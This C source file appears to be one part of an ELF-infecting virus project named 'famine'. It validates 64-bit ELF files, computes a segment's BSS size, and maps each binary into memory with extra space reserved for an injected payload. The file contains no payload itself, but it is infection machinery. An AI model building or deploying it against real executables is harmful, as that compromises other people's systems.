#include "map.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <errno.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include "famine.h"
#include "utils.h"

//uint8_t	*map_file(const char *filename, size_t *size) {
//	int		fd;
//	uint8_t	*file;
//	struct stat st;
//
//	fd = _syscall(SYS_open, filename, O_RDONLY);
//
//	if (_syscall(SYS_fstat, fd, &st) == -1) {
//		_syscall(SYS_close, fd);
//		return NULL;
//	}
//
//	file = (uint8_t *)_syscall(SYS_mmap, NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
//	if (file == MAP_FAILED) {
//		_syscall(SYS_close, fd);
//		return NULL;
//	}
//
//	_syscall(SYS_close, fd);
//
//	*size = st.st_size;
//
//	return file;
//}
//
int	check_elf_magic(int fd) {
	Elf64_Ehdr ehdr;

	if (_syscall(SYS_pread64, fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr) ||
		ehdr.e_ident[EI_MAG0] != ELFMAG0 ||
		ehdr.e_ident[EI_MAG1] != ELFMAG1 ||
		ehdr.e_ident[EI_MAG2] != ELFMAG2 ||
		ehdr.e_ident[EI_MAG3] != ELFMAG3) {
		return -1;
	}

	/* check if it's a 64-bit elf */
	if (ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
		return -1;
	}

	return 0;
}

uint64_t get_bss_size(int fd) {
	Elf64_Ehdr ehdr;
	Elf64_Phdr phdr;
	uint64_t bss_len = 0;


	if (_syscall(SYS_pread64, fd, &ehdr, sizeof(Elf64_Ehdr), 0) != sizeof(Elf64_Ehdr)) {
		return 0;
	}

	for (size_t i = 0; i < ehdr.e_phnum; i++) {
		if (_syscall(SYS_pread64, fd, &phdr, sizeof(Elf64_Phdr), ehdr.e_phoff + i * ehdr.e_phentsize) != sizeof(Elf64_Phdr)) {
			return 0;
		}

		if (phdr.p_type == PT_LOAD && phdr.p_flags == (PF_R | PF_W)) {
			bss_len = phdr.p_memsz - phdr.p_filesz;
			break;
		}
	}

	return bss_len;
}


int map_file(const char *filename, t_data *data) {
	int		fd;
	uint8_t	*file;
	struct stat st;
	char	buf[4096];

	fd = _syscall(SYS_open, filename, O_RDONLY);
	if (fd == -1) {
		return -1;
	}

	if (_syscall(SYS_fstat, fd, &st) == -1) {
		_syscall(SYS_close, fd);
		return -1;
	}

	if (check_elf_magic(fd) == -1) {
		_syscall(SYS_close, fd);
		return -1;
	}

	size_t size = st.st_size + data->payload_size + get_bss_size(fd);

	file = (uint8_t *)_syscall(SYS_mmap, NULL, size, PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (file == MAP_FAILED) {
		_syscall(SYS_close, fd);
		return -1;
	}

	void *ptr = file;

	while (1) {
		ssize_t ret = _syscall(SYS_read, fd, buf, 4096);
		if (ret == -1) {
			_syscall(SYS_close, fd);
			_syscall(SYS_munmap, file, size);
			return -1;
		}
		else if (ret == 0)
			break;
		ft_memcpy(ptr, buf, ret);
		ptr += ret;
	}

	_syscall(SYS_close, fd);

	data->elf.size = st.st_size;
	data->file = file;
	data->size = size;
	data->elf.mode = st.st_mode;

	return 0;
}

//uint8_t	*expand_file(uint8_t *file, size_t size, size_t new_size, t_data *data) {
//	uint8_t	*new_file;
//
//	new_file = (uint8_t *)_syscall(SYS_mmap, NULL, new_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
//
//	if (new_file == MAP_FAILED) {
//		return NULL;
//	}
//	ft_memset(new_file, 0, new_size);
//	ft_memcpy(new_file, file, size);
//
//
//	_syscall(SYS_munmap, file, size);
//
//	init_data(data, new_file, new_size);
//
//	return new_file;
//}
